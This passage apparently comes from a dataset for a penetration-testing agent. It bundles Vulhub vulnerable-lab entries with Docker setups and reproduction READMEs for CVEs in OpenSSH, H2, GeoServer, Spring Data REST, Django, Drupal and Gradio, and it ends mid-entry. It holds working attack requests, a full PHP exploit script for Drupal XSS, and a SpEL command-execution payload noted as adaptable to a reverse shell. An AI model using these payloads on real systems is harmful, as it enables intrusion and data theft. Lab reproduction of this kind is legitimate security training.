    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/openssh/CVE-2018-15473/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/openssh/CVE-2018-15473/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/openssh/CVE-2018-15473/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 113 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n sshd:\n   build: .\n   environment: \n    - ROOT_PASSWORD=vulhub\n   ports:\n    - \"20022:22\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/openssh/CVE-2018-15473/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 357 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/openssh:7.7\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex \\\n    && adduser --home /home/vulhub --shell /bin/bash --disabled-password --gecos \"\" vulhub \\\n    && echo \"vulhub:vulhub\" | chpasswd \\\n    && adduser --home /home/example --shell /bin/bash --disabled-password --gecos \"\" example \\\n    && echo \"example:123456\" | chpasswd\n```\n\n",
    "readme": "# OpenSSH Username Enumeration (CVE-2018-15473)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOpenSSH is a suite of secure networking utilities based on the Secure Shell protocol, which provides a secure channel over an unsecured network in a client–server architecture.\n\nCVE-2018-15473 is a medium-severity vulnerability affecting OpenSSH versions up to and including 7.7. This vulnerability allows user enumeration due to the system not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed. As a result, a remote attacker can test whether a certain user exists on a target OpenSSH server.\n\nReferences:\n\n- http://openwall.com/lists/oss-security/2018/08/15/5\n- https://github.com/Rhynorater/CVE-2018-15473-Exploit\n- https://www.anquanke.com/post/id/157607\n\n## Vulnerable environment\n\nExecute following commands to start a OpenSSH server 7.7p1:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server is started, you can log in to OpenSSH server by `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022` and password `vulhub`.\n\n## Vulnerability reproduce\n\nUse [CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit) to enumerate usernames in the dictionary:\n\n```\npython3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip\n```\n\n![](1.png)\n\nAs you can see, `root`、`example`、`vulhub`、`nobody` are existing usernames, `rootInvalid`、`user`、`phithon` are non-existent usernames.\n"
  },
  {
    "filename": "CVE-2021-42392.md",
    "filenamenomd": "CVE-2021-42392",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/h2database/CVE-2021-42392/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/h2database/CVE-2021-42392/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 117 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/spring-with-h2database:2.0.204\n    ports:\n      - \"8080:8080\"\n      - \"5005:5005\"\n\n```\n\n",
    "readme": "# H2 Database Web Console Pre-Auth JNDI Injection RCE (CVE-2021-42392)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nH2 database is a fast, open-source Java-based relational database management system (RDBMS) that can be used in both embedded (within a Java application) and client-server modes.\n\nSpringboot with h2 database comes with a web management page if you set the following options:\n\n```\nspring.h2.console.enabled=true\nspring.h2.console.settings.web-allow-others=true\n```\n\nH2 Database version before 1.4.206 with this management page supports to use JNDI to load the JDBC driver, which can lead to remote code execution via JNDI injection.\n\nReferences:\n\n- <https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/>\n- <https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e>\n- <https://github.com/h2database/h2database/commit/b24aa46f48904ce64443f8f4353d70a2eed09037>\n- <https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6>\n\n## Setup\n\nStart a spring-boot with h2 database 2.0.204:\n\n```\ndocker compose up -d\n```\n\nAfter started the container, the spring-boot is listening on `http://your-ip:8080`, the management page is `http://your-ip:8080/h2-console/` by default.\n\n## Vulnerability Reproduce\n\nBefore reproducing this issue, we can confirm that the payload in [CVE-2018-10054](../CVE-2018-10054) is not exploitable because in-memory database is disabled after 1.4.197:\n\n![](1.png)\n\nThe H2 console after version 1.4.197 added a new [`-ifNotExists` option](https://github.com/h2database/h2database/pull/1726) that disable remote database creation by default. So you are unable to authenticate the H2 console without a known database file, such as in-memory database.\n\nHowever, the H2 console still supports [JNDI injection](https://www.veracode.com/blog/research/exploiting-jndi-injections-java), which can be used to execute arbitrary code.\n\nSimply use the [Java-Chains](https://github.com/vulhub/java-chains) to exploit the vulnerability.\n\nFirst, generate the malicious JNDI URL by using the `JNDI/JNDIResourceRefPayload` module (don't forget to input the command you want to execute):\n\n![](2.png)\n\nThen, go to the H2 Web console login page, enter `javax.naming.InitialContext` as the Driver class, and the JNDI URL generated by Java-Chains as the JDBC URL.\n\n![](3.png)\n\nAs you can see, the command has been executed successfully:\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2021-40822.md",
    "filenamenomd": "CVE-2021-40822",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2021-40822/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/geoserver/CVE-2021-40822/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 96 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/geoserver:2.19.1\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# GeoServer Unauthenticated Server-Side Request Forgery (CVE-2021-40822)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.\n\nIn GeoServer versions prior to 2.19.3, 2.18.5, and 2.17.6, there is a Server-Side Request Forgery (SSRF) vulnerability in the WMS GetMap request. An attacker can exploit this vulnerability to make requests to internal or external services through the GeoServer server.\n\nReferences:\n\n- <https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf>\n- <https://nvd.nist.gov/vuln/detail/CVE-2021-40822>\n\n## Vulnerable Environment\n\nExecute the following command to start a GeoServer 2.19.1 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can browse the default page of GeoServer at `http://your-ip:8080/geoserver`.\n\n## Exploit\n\nThe vulnerability exists in the `TestWfsPost` endpoint. An attacker can use the `url` parameter to make the server send requests to arbitrary URLs. The endpoint accepts several parameters:\n\n- `url`: The target URL that GeoServer will send request to\n- `body`: The request body to be sent. If this parameter is empty, GeoServer will send a GET request; if it contains any value, GeoServer will send a POST request\n- `username`: Username for basic authentication (optional)\n- `password`: Password for basic authentication (optional)\n\nSend the following request to the `TestWfsPost` endpoint:\n\n```\nPOST /geoserver/TestWfsPost HTTP/1.1\nHost: internal\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 96\n\nform_hf_0=&url=http://interal/geoserver/../&body=testtest&username=admin&password=admin\n```\n\nUse `google.com` as the target URL, and you will see that response from `google.com` is returned.\n\n![](1.png)\n\n> Note: The host in the `url` parameter must match the `Host` header in your request, otherwise GeoServer will return an error. For example, if the domain in `url` parameter is `internal`, then the `Host` header should also be `internal`.\n"
  },
  {
    "filename": "CVE-2017-8046.md",
    "filenamenomd": "CVE-2017-8046",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2017-8046/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2017-8046/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 86 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring:\n   image: vulhub/spring-rest-data:2.6.6\n   ports:\n    - \"8080:8080\"\n```\n\n",
    "readme": "# Spring Data REST Remote Code Execution (CVE-2017-8046)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSpring Data REST is built on top of Spring Data to help developers easily create REST-style web services. In the Spring Data REST version before 2.6.9 or 3.0.1, the PATCH method of the REST API (implementing [RFC6902](https://tools.ietf.org/html/rfc6902)), the path value is passed to `setValue`, which leads to the execution of SpEL expressions, triggering a remote code execution vulnerability.\n\nReference links:\n\n- http://xxlegend.com/2017/09/29/Spring%20Data%20Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/\n- https://tech.meituan.com/Spring_Data_REST_远程代码执行漏洞%28CVE-2017-8046%29_分析与复现.html\n\n## Environment Setup\n\nExecute the following command to start a Web application based on Spring Data REST 2.6.6:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080/` to see a JSON format response, indicating this is a RESTful API server.\n\n## Vulnerability Reproduce\n\nVisit `http://your-ip:8080/customers/1` to see a resource. We use a PATCH request to modify it:\n\n```\nPATCH /customers/1 HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json-patch+json\nContent-Length: 202\n\n[{ \"op\": \"replace\", \"path\": \"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname\", \"value\": \"vulhub\" }]\n\n```\n\nThe path value is a SpEL expression. Sending the above packet will execute the command `touch /tmp/success` represented by `new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}`. Then enter the container with `docker compose exec spring bash` to check:\n\n![](1.png)\n\nAs you can see, the file \"/tmp/success\" has been created successfully.\n\nChange the bytecode to a reverse shell command (Note: [Java reverse shell limitations and workarounds](http://www.jackson-t.ca/runtime-exec-payloads.html)), and successfully get the shell:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2022-34265.md",
    "filenamenomd": "CVE-2022-34265",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/docker-entrypoint.sh\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/app.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/views.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/urls.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/models.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/apps.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/__init__.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/migrations/0001_initial.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/migrations/__init__.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 446 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/django:4.0.5\n    ports:\n    - \"8000:8000\"\n    depends_on:\n    - db\n    volumes:\n    - ./web:/usr/src\n    - ./docker-entrypoint.sh:/docker-entrypoint.sh\n    entrypoint:\n    - bash\n    - /docker-entrypoint.sh\n    command:\n    - python\n    - app.py\n    - runserver\n    - 0.0.0.0:8000\n  db:\n   image: postgres:13-alpine\n   environment:\n    - POSTGRES_PASSWORD=postgres\n    - POSTGRES_DB=CVE_2022_34265\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/docker-entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 121 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nset -ex\ncd /usr/src\n\nwait-for-it.sh -t 0 db:5432 -- echo \"database is up\"\n\npython app.py migrate\n\nexec \"$@\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/app.py\n\n- Extension: .py\n- Language: python\n- Size: 976 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport os\nimport sys\n\n\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", __name__)\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nDEBUG = True\nSECRET_KEY = 'vulhub'\nALLOWED_HOSTS = ['*']\nMIDDLEWARE = [\n    'django.middleware.common.CommonMiddleware',\n]\n\nROOT_URLCONF = 'vuln.urls'\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'handlers': {\n        'console': {\n            'class': 'logging.StreamHandler',\n        },\n    },\n    'loggers': {\n        'django': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'WARNING'),\n        },\n    },\n}\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': 'CVE_2022_34265',\n        'USER': 'postgres',\n        'PASSWORD': 'postgres',\n        'HOST': 'db',\n        'PORT': '5432',\n    }\n}\nINSTALLED_APPS = [\n    'vuln'\n]\n\n\nfrom django.core.management import execute_from_command_line\nexecute_from_command_line(sys.argv)\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/views.py\n\n- Extension: .py\n- Language: python\n- Size: 686 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nfrom django.http import HttpResponse, JsonResponse\nfrom django.db.models.functions import Trunc\nfrom django.db.models import Count\nfrom .models import WebLog\n\n\ndef create_log(request):\n    method = request.method\n    url = request.build_absolute_uri()\n    user_agent = request.META.get('HTTP_USER_AGENT')\n    WebLog.objects.create(\n        method=method,\n        url=url,\n        user_agent=user_agent\n    )\n\n\ndef vul(request):\n    create_log(request)\n    date = request.GET.get('date', 'minute')\n    objects = list(WebLog.objects.annotate(time=Trunc('created_time', date)).values('time').order_by('-time').annotate(count=Count('id')))\n    return JsonResponse(data=objects, safe=False)\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/urls.py\n\n- Extension: .py\n- Language: python\n- Size: 112 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nfrom django.urls import include, path, re_path\nfrom . import views\n\n\nurlpatterns = [\n    path('', views.vul),\n]\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/models.py\n\n- Extension: .py\n- Language: python\n- Size: 281 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nfrom operator import mod\nfrom django.db import models\n\n\nclass WebLog(models.Model):\n    method = models.CharField(max_length=16)\n    url = models.CharField(max_length=256)\n    user_agent = models.CharField(max_length=256)\n    created_time = models.DateTimeField(auto_now_add=True)\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/apps.py\n\n- Extension: .py\n- Language: python\n- Size: 140 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nfrom django.apps import AppConfig\n\n\nclass VulnConfig(AppConfig):\n    name = 'vuln'\n    default_auto_field = 'django.db.models.BigAutoField'\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/__init__.py\n\n- Extension: .py\n- Language: python\n- Size: 0 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/migrations/0001_initial.py\n\n- Extension: .py\n- Language: python\n- Size: 690 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n# Generated by Django 4.0.6 on 2022-07-13 22:50\n\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='WebLog',\n            fields=[\n                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('method', models.CharField(max_length=16)),\n                ('url', models.CharField(max_length=256)),\n                ('user_agent', models.CharField(max_length=256)),\n                ('created_time', models.DateTimeField(auto_now_add=True)),\n            ],\n        ),\n    ]\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2022-34265/web/vuln/migrations/__init__.py\n\n- Extension: .py\n- Language: python\n- Size: 0 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n\n```\n\n",
    "readme": "# Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDjango is a high-level Python web framework that encourages rapid development and clean, pragmatic design.\n\nDjango released a security update on July 4, 2022, which fixes a SQL injection vulnerability in the Trunc() and Extract() database functions. This vulnerability affects Django versions before 4.0.6, 3.2.14.\n\nReferences:\n\n- https://www.djangoproject.com/weblog/2022/jul/04/security-releases/\n- https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Django 4.0.5 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can access the web page at `http://your-ip:8000`.\n\n## Vulnerability Reproduction\n\nThe web application uses the `Trunc` function to aggregate page click counts by datetime. Visit `http://your-ip:8000/?date=minute` to see the number of clicks per minute:\n\n![](1.png)\n\nTo exploit the SQL injection vulnerability, modify the `date` parameter with malicious input:\n\n```\nhttp://your-ip:8000/?date=xxxx'xxxx\n```\n\nThe SQL error message will be displayed, confirming the successful injection:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2019-6341.md",
    "filenamenomd": "CVE-2019-6341",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2019-6341/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2019-6341/blog-poc.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2019-6341/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 71 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/drupal:8.5.0\n   ports:\n    - \"8080:80\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2019-6341/blog-poc.php\n\n- Extension: .php\n- Language: php\n- Size: 4809 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n/*\nusage: php poc.php <target-ip>\n\nDate: 1 March 2019\nExploit Author: TrendyTofu\nOriginal Discoverer: Sam Thomas\nVersion: <= Drupal 8.6.2\nTested on: Drupal 8.6.2 Ubuntu 18.04 LTS x64 with ext4.\nTested not wokring on: Drupal running on MacOS with APFS\nCVE : CVE-2019-6341\nReference: https://www.zerodayinitiative.com/advisories/ZDI-19-291/\n\n*/\n\n$host = $argv[1];\n$port = $argv[2];\n\n$pk =   \"GET /user/register HTTP/1.1\\r\\n\".\n\t\"Host: \".$host.\"\\r\\n\".\n\t\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\".\n\t\"Accept-Language: en-US,en;q=0.5\\r\\n\".\n\t\"Referer: http://\".$host.\"/user/login\\r\\n\".\n\t\"Connection: close\\r\\n\\r\\n\";\n\n$fp = fsockopen($host,$port,$e,$err,1);\nif (!$fp) {die(\"not connected\");}\nfputs($fp,$pk);\n$out=\"\";\nwhile (!feof($fp)){\n  $out.=fread($fp,1);\n}\nfclose($fp);\n\npreg_match('/name=\"form_build_id\" value=\"(.*)\"/', $out, $match);\n$formid = $match[1];\n//var_dump($formid);\n//echo \"form id is:\". $formid;\n//echo $out.\"\\n\";\nsleep(1);\n\n$data = \n\"Content-Type: multipart/form-data; boundary=---------------------------60928216114129559951791388325\\r\\n\".\n\"Connection: close\\r\\n\".\n\"\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"mail\\\"\\r\\n\".\n\"\\r\\n\".\n\"test324@example.com\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"name\\\"\\r\\n\".\n\"\\r\\n\".\n\"test2345\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"files[user_picture_0]\\\"; filename=\\\"xxx\\xc0.gif\\\"\\r\\n\".\n\"Content-Type: image/gif\\r\\n\".\n\"\\r\\n\".\n\"GIF\\r\\n\".\n\"<HTML>\\r\\n\".\n\"\t<HEAD>\\r\\n\".\n\"\t\t<SCRIPT>alert(123);</SCRIPT>\\r\\n\".\n\"\t</HEAD>\\r\\n\".\n\"\t<BODY>\\r\\n\".\n\"\t</BODY>\\r\\n\".\n\"</HTML>\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"user_picture[0][fids]\\\"\\r\\n\".\n\"\\r\\n\".\n\"\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"user_picture[0][display]\\\"\\r\\n\".\n\"\\r\\n\".\n\"1\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"form_build_id\\\"\\r\\n\".\n\"\\r\\n\".\n//\"form-KyXRvDVovOBjofviDPTw682MQ8Bf5es0PyF-AA2Buuk\\r\\n\".\n$formid.\"\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"form_id\\\"\\r\\n\".\n\"\\r\\n\".\n\"user_register_form\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"contact\\\"\\r\\n\".\n\"\\r\\n\".\n\"1\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"timezone\\\"\\r\\n\".\n\"\\r\\n\".\n\"America/New_York\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"_triggering_element_name\\\"\\r\\n\".\n\"\\r\\n\".\n\"user_picture_0_upload_button\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"_triggering_element_value\\\"\\r\\n\".\n\"\\r\\n\".\n\"Upload\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"_drupal_ajax\\\"\\r\\n\".\n\"\\r\\n\".\n\"1\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"ajax_page_state[theme]\\\"\\r\\n\".\n\"\\r\\n\".\n\"bartik\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"ajax_page_state[theme_token]\\\"\\r\\n\".\n\"\\r\\n\".\n\"\\r\\n\".\n\"-----------------------------60928216114129559951791388325\\r\\n\".\n\"Content-Disposition: form-data; name=\\\"ajax_page_state[libraries]\\\"\\r\\n\".\n\"\\r\\n\".\n\"bartik/global-styling,classy/base,classy/messages,core/drupal.ajax,core/drupal.collapse,core/drupal.timezone,core/html5shiv,core/jquery.form,core/normalize,file/drupal.file,system/base\\r\\n\".\n\"-----------------------------60928216114129559951791388325--\\r\\n\";\n\n$pk = \t\"POST /user/register?element_parents=user_picture/widget/0&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\\r\\n\".\n\t\"Host: \".$host.\"\\r\\n\".\n\t\"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\\r\\n\".\n\t\"Accept: application/json, text/javascript, */*; q=0.01\\r\\n\".\n\t\"Accept-Language: en-US,en;q=0.5\\r\\n\".\n\t\"X-Requested-With: XMLHttpRequest\\r\\n\".\n\t\"Referer: http://\" .$host. \"/user/register\\r\\n\".\n\t\"Content-Length: \". strlen($data). \"\\r\\n\".\n\t$data;\n\necho \"uploading file, please wait...\\n\";\n\nfor ($i =1; $i <= 2; $i++){\n$fp = fsockopen($host,$port,$e,$err,1);\nif (!$fp) {die(\"not connected\");}\nfputs($fp,$pk);\n$out=\"\";\nwhile (!feof($fp)){\n  $out.=fread($fp,1);\n}\nfclose($fp);\n\n// echo \"Got \".$i.\"/2 500 errors\\n\";\n// echo $out.\"\\n\";\nsleep(1);\n}\n\necho \"please check /var/www/html/drupal/sites/default/files/pictures/YYYY-MM\\n\";\n\n?>\n\n```\n\n",
    "readme": "# Drupal Cross-Site Scripting by File Upload (CVE-2019-6341)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDrupal is a free and open-source web content management framework written in PHP.\n\nA cross-site scripting (XSS) vulnerability exists in Drupal 7.x before 7.65, Drupal 8.x before 8.5.14 and 8.6.x before 8.6.13. The vulnerability is caused by improper handling of file uploads in the file module or subsystem, which can lead to stored XSS attacks.\n\nReferences:\n\n- <https://www.drupal.org/sa-core-2019-004>\n- <https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed>\n- <https://paper.seebug.org/897/>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Drupal 8.5.0 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080/` to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.\n\n## Vulnerability Reproduction\n\nThis vulnerability exploits a flaw in Drupal's file module that allows uploading a specially crafted file without extension. The file appears to be an image but actually contains HTML code with embedded JavaScript. When other users visit the link to this file, the XSS payload will be executed.\n\nBy default, Drupal stores uploaded images in the `/sites/default/files/pictures/<YYYY-MM>/` directory.\n\nTo exploit the vulnerability, use the PoC script from [thezdi/PoC](https://github.com/thezdi/PoC/tree/master/Drupal) to create and upload a malicious GIF file. Execute the following command, where the first argument is the target IP and the second is the target port:\n\n```\nphp cve-2019-6341-exp.php 192.168.11.1 8080\n```\n\n![1](1.png)\n\nAfter successful upload, visiting the image location will trigger the XSS vulnerability:\n\n![2](2.png)\n\nNote:\n\n1. Chrome and Firefox browsers have built-in XSS filters, so it's recommended to use Edge or IE browsers for testing.\n2. The uploaded image name ends with \"_0\" due to Drupal's rule mechanism. For more details, see [Drupal 1-click to RCE Analysis](https://paper.seebug.org/897/)\n3. The chain of this bug and [CVE-2019-6339](../CVE-2019-6339/README.md), which can lead to remote code execution by 1 click\n"
  },
  {
    "filename": "CVE-2023-51449.md",
    "filenamenomd": "CVE-2023-51449",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/gradio/CVE-2023-51449/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gradio/CVE-2023-51449/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 75 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/gradio:4.10.0\n   ports:\n    - \"7860:7860\"\n\n```\n\n",
    "readme": "# Gradio `/file` Interface Directory Traversal (CVE-2023-51449)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGradio is a Python library that allows users to quickly build visual web interfaces for machine learning models without writing any front-end code.\n\nIn Gradio versions 4.11 and below, when authentication is not enabled, an attacker who knows the file path can use a public URL to access arbitrary files on the server running the Gradio application.\n\nReferences:\n\n- <https://github.com/gradio-app/gradio/pull/6833>\n- <https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2>\n\n## Environment Setup\n\nExecute the following command to start an application built with Gradio 4.10.0:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, authentication is disabled by default. You can access the application at `http://your-ip:7860`.\n\n## Vulnerability Reproduction\n\nFirst, use the upload interface to upload any 